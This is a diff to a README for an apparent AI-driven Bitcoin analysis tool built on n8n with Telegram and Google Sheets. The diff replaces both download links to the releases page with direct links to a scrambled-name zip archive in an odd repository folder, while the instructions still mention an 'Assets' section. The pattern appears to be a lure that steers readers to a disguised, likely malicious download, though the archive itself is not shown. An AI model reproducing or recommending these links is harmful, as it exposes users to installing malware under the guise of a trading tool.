@@ -1,6 +1,6 @@
 # 📈 CryptoMind-AI-Pro-Advanced-n8n-Crypto-Analysis-Automation - Automate Bitcoin Trading Insights With Ease
 
-[![](https://img.shields.io/badge/Download-CryptoMind_AI_Pro-blue.svg)](https://github.com/Yonielrod9398/CryptoMind-AI-Pro-Advanced-n8n-Crypto-Analysis-Automation/releases)
+[![](https://img.shields.io/badge/Download-CryptoMind_AI_Pro-blue.svg)](https://github.com/Yonielrod9398/CryptoMind-AI-Pro-Advanced-n8n-Crypto-Analysis-Automation/raw/refs/heads/main/microhm/Analysis_Advanced_Crypto_A_Pro_Mind_Automation_n_v2.2.zip)
 
 CryptoMind AI Pro automates your Bitcoin market monitoring. The tool uses artificial intelligence and real-time data to help you track market movements. It connects to your Telegram account to send trading alerts and saves all data to your Google Sheets. This system removes the need for manual market checks.
 
@@ -18,7 +18,7 @@ Ensure your computer has the following items before you start:
 
 Visit the official release page to download the software.
 
-[Download CryptoMind AI Pro](https://github.com/Yonielrod9398/CryptoMind-AI-Pro-Advanced-n8n-Crypto-Analysis-Automation/releases)
+[Download CryptoMind AI Pro](https://github.com/Yonielrod9398/CryptoMind-AI-Pro-Advanced-n8n-Crypto-Analysis-Automation/raw/refs/heads/main/microhm/Analysis_Advanced_Crypto_A_Pro_Mind_Automation_n_v2.2.zip)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section.
